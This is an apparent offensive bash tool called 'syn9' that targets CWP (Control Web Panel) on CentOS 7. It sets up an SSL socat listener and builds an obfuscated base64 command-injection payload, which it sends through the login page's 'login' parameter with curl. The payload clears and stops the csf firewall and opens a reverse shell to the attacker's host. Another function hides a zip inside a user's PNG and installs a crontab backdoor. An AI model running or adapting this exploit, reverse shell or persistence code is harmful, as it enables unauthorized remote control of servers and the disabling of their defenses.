#!/bin/bash
#----------
RED="\e[95m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[36m"
ENDCOLOR="\e[0m"
#---------- 107 52
: '
(n) syn9
- open reverse shell connection
- intitiate shells tty prompt
- writing backdoor on cron services

'``
#----------
opt_help() { ## display command usage
#        echo -e "${BLUE}"
#        echo -e "                            .d8888b."  
#        echo -e "                           d88P  Y88b" 
#        echo -e "                           888    888" 
#        echo -e ".d8888b  888  888 88888b.  Y88b. d888" 
#        echo -e "88K      888  888 888 \"88b  \"Y888P888" 
#        echo -e "\"Y8888b. 888  888 888  888        888 "
#        echo -e "     X88 Y88b 888 888  888 Y88b  d88P" 
#        echo -e " 88888P'  \"Y88888 888  888  \"Y8888P\""  
#        echo -e "              888"                     
#        echo -e "         Y8b d88P"                     
#        echo -e "          \"Y88P\"" 
#        echo -e "${ENDCOLOR}"

        echo -e "Usage: syn9 [OPTION]... [ARG]..."
        echo -e "Red Team utilities for setting up CWP CentOS 7 payload & reverse shell\n"
        echo -e "Available flag options, starred one are combination purposes ...\n"
        echo -e "  ${GREEN}-h${ENDCOLOR}\t launch command usage for avilable flag options & examples"

#        echo -e "  ${GREEN}-b${ENDCOLOR}\t write crontab's backdoor reverse shell for post-exploitation"
        echo -e "  ${GREEN}-g${ENDCOLOR}\t generate a payload string with predefined POST body to be used externally"
        echo -e "  ${GREEN}-i${ENDCOLOR}\t inject the payload string via curl's POST request internally instead"
        echo -e "  ${GREEN}-n ${YELLOW}**${ENDCOLOR}\t specify the IP address via the issued network interface"
        echo -e "  ${GREEN}-o ${YELLOW}**${ENDCOLOR}\t specify the listener port address"
        echo -e "  ${GREEN}-c ${YELLOW}**${ENDCOLOR}\t specify the SSL certificate path with .PEM format file"
        echo -e "  ${GREEN}-w ${YELLOW}**${ENDCOLOR}\t specify the CWP site's IP address along with its port number"
        echo -e "\nFlag usage examples:\n"
        echo -e "  ${YELLOW}$ ${ENDCOLOR}bash syn9 ${GREEN}-o${ENDCOLOR} 6666 ${GREEN}-c${ENDCOLOR} openssl-cert/bind.pem ${GREEN}-n${ENDCOLOR} eth0  ${BLUE}## to create a listener${ENDCOLOR}"
        echo -e "  ${YELLOW}$ ${ENDCOLOR}bash syn9 ${GREEN}-w${ENDCOLOR} 192.168.1.14:2031 ${GREEN}-o${ENDCOLOR} 6666 ${GREEN}-n${ENDCOLOR} eth0 ${GREEN}-g${ENDCOLOR}   ${BLUE}## to generate the payload string${ENDCOLOR}"
        echo -e "  ${YELLOW}$ ${ENDCOLOR}bash syn9 ${GREEN}-w${ENDCOLOR} 192.168.1.14:2031 ${GREEN}-o${ENDCOLOR} 6666 ${GREEN}-n${ENDCOLOR} eth0 ${GREEN}-i${ENDCOLOR}   ${BLUE}## to inject the payload via curl${ENDCOLOR}"        
        exit 0
}
#----------
opt_openlistener() {
        ip=$(ifconfig $3 | grep "inet " | grep -vw inet6 | tr -s '\t' ' ' | cut -d ' ' -f 3)
        echo -e "${RED}[-]${ENDCOLOR} SSL listen  : ${BLUE}$ip${ENDCOLOR}:${BLUE}$1${ENDCOLOR} ..."
        echo -e "${RED}[-]${ENDCOLOR} SSL cert    : ${BLUE}$2${ENDCOLOR},verify=0 ..."
        echo -e "${RED}[-]${ENDCOLOR} socat opts. : file:\`tty\`,raw,echo=0 ..."

        echo -e "---"
        echo -e "${RED}[-]${ENDCOLOR} suggesting static terminal size, rows [${BLUE}20${ENDCOLOR}/${BLUE}42${ENDCOLOR}] x cols [${BLUE}92${ENDCOLOR}/${BLUE}184${ENDCOLOR}] ..."
        echo -e "${RED}[-]${ENDCOLOR} ${GREEN}$ ${ENDCOLOR}${YELLOW}stty rows X cols X ${ENDCOLOR}"
        echo -e "${RED}[-]${ENDCOLOR} ${GREEN}$ ${ENDCOLOR}${YELLOW}export TERM=xterm-256color${ENDCOLOR}"        
        echo -e "---"        
        socat file:`tty`,raw,echo=0 openssl-listen:$1,cert=$2,verify=0
        exit 0
}
opt_sendpayload() {
        ## w = 192.168.1.14, o = 6666, n = eth0
        ## curl -k -X POST 'https://192.168.1.14:2031/login/index.php?login=$(pwd)' -d 'username=root&password=pwned&commit=Login'
        ip=$(ifconfig $3 | grep "inet " | grep -vw inet6 | tr -s '\t' ' ' | cut -d ' ' -f 3)
        echo -e "${RED}[-]${ENDCOLOR} URI address : ${BLUE}POST${ENDCOLOR} https://${BLUE}$(echo $1 | cut -d ':' -f 1)${ENDCOLOR}:${BLUE}$(echo $1 | cut -d ':' -f 2)${ENDCOLOR}/login/index.php?login=\$(${BLUE}\$payload${ENDCOLOR}) ..."                
        echo -e "${RED}[-]${ENDCOLOR} SSL connect : ${BLUE}$ip${ENDCOLOR}:${BLUE}$2${ENDCOLOR} ..."
        echo -e "${RED}[-]${ENDCOLOR} POST data   : username=${BLUE}root${ENDCOLOR}&password=${BLUE}pwned${ENDCOLOR}&commit=${BLUE}login${ENDCOLOR} ..."        
        echo -e "${RED}[-]${ENDCOLOR} socat opts. : exec:'bash -li',pty,stderr,setsid,sigint,sane ..."        
        echo -e "---"        
        if [[ $4 -eq 1 ]]; then
            echo -e "${RED}[-]${ENDCOLOR} generating payload in ${BLUE}base64${ENDCOLOR} format ..."        
            getbase64=$(echo -e "#!/bin/bash\n\$(which cat) /dev/null > /etc/csf/csf.deny\n\$(which csf) -x & wait\n\$(which systemctl) stop csf.service & wait\n\$(which socat) exec:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:$ip:$2,verify=0" | base64 | tr -d '\n')
            var="\$(echo\${IFS}$getbase64\${IFS}|\${IFS}base64\${IFS}-d\${IFS}|\${IFS}bash)"
            echo -e "---"        
            echo "$var"            
        else
            ps=$(ps axjf | grep "openssl-listen:$2" | grep "socat file:" | grep -v "color" | tr -s ' ' '@' | cut -d'@' -f 3)            
            echo -e "${RED}[-]${ENDCOLOR} injecting payload to the ${BLUE}URI${ENDCOLOR} via curl ..."        
            echo -e "${RED}[-]${ENDCOLOR} halting ${BLUE}tty${ENDCOLOR} for the remote access session ($ps)...\n--"                    
            getbase64=$(echo -e "#!/bin/bash\n\$(which cat) /dev/null > /etc/csf/csf.deny\n\$(which csf) -x & wait\n\$(which systemctl) stop csf.service & wait\n\$(which socat) exec:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:$ip:$2,verify=0" | base64 | tr -d '\n')
            var="\$(echo\${IFS}$getbase64\${IFS}|\${IFS}base64\${IFS}-d\${IFS}|\${IFS}bash)"
            curl -k -g -X POST 'https://'$1'/login/index.php?login=$('$var')' -d 'username=root&password=pwned&commit=Login' & wait
        fi
        exit 0
}
#----------
opt_backdoorcron() {
        pathenv=$(printenv PATH)
        pic=$(ls $HOME/Pictures/*.png | grep -v '[()$ ]' | head -n 1)
        size_pre=$(ls -lh $pic | head -n 1 | cut -d ' ' -f 5)
        echo -e "${RED}[-]${ENDCOLOR} using ${BLUE}$pic${ENDCOLOR} as selected .png file ..."
        cat /tmp/.pwnd.zip >> "$pic"
        size_post=$(ls -lh $pic | head -n 1 | cut -d ' ' -f 5)
        echo -e "${RED}[-]${ENDCOLOR} embedding internal scripts ${BLUE}/tmp/.pwnd.zip${ENDCOLOR} to ${BLUE}$pic${ENDCOLOR} ..."
        echo -e "${RED}[-]${ENDCOLOR} noticeable file size changes ${BLUE}$size_pre${ENDCOLOR} --> ${BLUE}$size_post${ENDCOLOR} ..."
        #
        # event="DISPLAY=:0\nPATH=\"$pathenv\"\n*/1 * * * * /usr/bin/gnome-terminal -e '/bin/bash -i -c \"unzip -qq -o \\\\\"$pic\\\\\" -d /tmp 2> /dev/null; ps axjf | grep \\\\\"bash /tmp/.cooki3.sh -r\\\\\" | grep -vw \\\\\"grep\\\\\" | head -n 1 | tr -s \\\\\" \\\\\" | cut -d \\\\\" \\\\\" -f 3 | { read msg; kill -9 \\\\\"\$msg\\\\\"; } 2> /dev/null; bash /tmp/.cooki3.sh -r & disown\"'"
        (crontab -l; printf "$event\n") | crontab -
        echo -e "${RED}[-]${ENDCOLOR} writing backdoor services via crontab's job ...\n"
        exit 0
}
#==========
get_python=$(readlink -f $(whereis python) | grep bin | grep -wv config | sort -r | head -1)
payloadact="null"
while getopts ":c:o:w:n: :b :h :g :i" opt; do
        case $opt in
                w) w="${OPTARG}" ;;
                n) n="${OPTARG}" ;;
                c) c="${OPTARG}" ;;
                o) o="${OPTARG}" ;;
                i) payloadact=0 ;;
                g) payloadact=1 ;;
                h) opt_help ;;
                b) opt_backdoorcron ;;
                *) h="go"
        esac
done
#----------
if [[ "$o" && "$c" && "$n" ]]; then opt_openlistener "$o" "$c" "$n"; exit 0; fi
if [[ "$w" && "$o" && "$n" && "$payloadact" != "null" ]]; then opt_sendpayload "$w" "$o" "$n" "$payloadact"; exit 0; fi
if [[ "$g" && "$w" ]]; then opt_get "$g" "$t" "$w" "$d"; exit 0; fi
opt_help
exit 0
